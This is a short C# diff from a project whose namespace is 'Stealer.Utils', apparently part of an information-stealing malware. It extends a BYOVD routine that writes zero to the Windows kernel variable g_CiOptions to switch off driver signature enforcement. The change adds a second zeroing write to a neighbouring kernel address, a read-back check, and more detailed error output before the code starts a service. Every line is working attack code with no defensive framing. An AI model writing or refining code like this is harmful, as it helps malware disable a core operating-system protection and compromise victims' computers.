@@ -170,12 +170,18 @@ namespace Stealer.Utils
                 // 3. Read original g_CiOptions
                 uint originalOptions = ReadKernelMemory32(gCiOptionsKernelAddr);
 
-                // Write 0 to disable DSE
+                // Write 0 to disable DSE on g_CiOptions and adjacent g_CiEnabled
                 if (!WriteKernelMemory32(gCiOptionsKernelAddr, 0))
                 {
                     errorMsg = "BYOVD: WriteKernelMemory32 failed to clear g_CiOptions";
                     return false;
                 }
+
+                // Also attempt write to adjacent g_CiEnabled location if present
+                WriteKernelMemory32(new IntPtr(gCiOptionsKernelAddr.ToInt64() - 4), 0);
+
+                // Verification read after write
+                uint checkOptions = ReadKernelMemory32(gCiOptionsKernelAddr);
 
                 bool started = false;
                 try
@@ -185,7 +191,7 @@ namespace Stealer.Utils
                     {
                         int sErr = Marshal.GetLastWin32Error();
                         if (sErr == 1056) started = true;
-                        else errorMsg = "StartService failed after DSE patch (Win32 error " + sErr + ")";
+                        else errorMsg = "StartService failed after DSE patch (Win32 error " + sErr + ", addr=0x" + gCiOptionsKernelAddr.ToString("X") + ", orig=" + originalOptions + ", check=" + checkOptions + ")";
                     }
                 }
                 finally
